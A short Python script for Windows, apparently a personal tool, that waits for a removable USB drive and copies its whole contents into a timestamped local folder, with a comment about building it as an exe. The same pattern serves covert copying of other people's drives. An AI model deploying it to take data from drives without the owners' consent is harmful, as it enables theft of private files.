'''
 !/usr/bin/env python
 Function： ScanUSB
 Compiler：PyCharm 
 Developer：Zong Zhaopeng
 Date:  2018/10/10 19:58
 Encoding: utf-8
 Contact: 1003160664@qq.com
 Version: 1.0
 References:
'''
import os
import time
from datetime import datetime
import shutil
import win32file
def locate_usb():
    drive_list = []
    drivebits=win32file.GetLogicalDrives()
    for d in range(1,26):
        mask=1 << d
        if drivebits & mask:
            # here if the drive is at least there
            drname='%c:/' % chr(ord('A')+d)
            # drname='%c:\\' % chr(ord('A')+d)
            t=win32file.GetDriveType(drname)
            if t == win32file.DRIVE_REMOVABLE:
                drive_list.append(drname)
    return drive_list

# 打印U盘盘符
# print(len(locate_usb()))


# 要复制到的路径
save_path = os.getcwd() #输入你要将U盘文件复制到你电脑中哪个文件夹

#一直处于循环，直到检测到U盘存在。
while (True):
    # U盘的盘符
    if len(locate_usb()) > 0:
        usb_path = locate_usb()[0]
        print(usb_path)
        if os.path.exists(usb_path):
            shutil.copytree(usb_path, os.path.join(save_path, datetime.now().strftime("%Y%m%d_%H%M%S")))
            break
    else:
        i = 0
        while i < 100:
            i += 1
        # sleep 生成exe时，容易关闭
        # time.sleep(3)
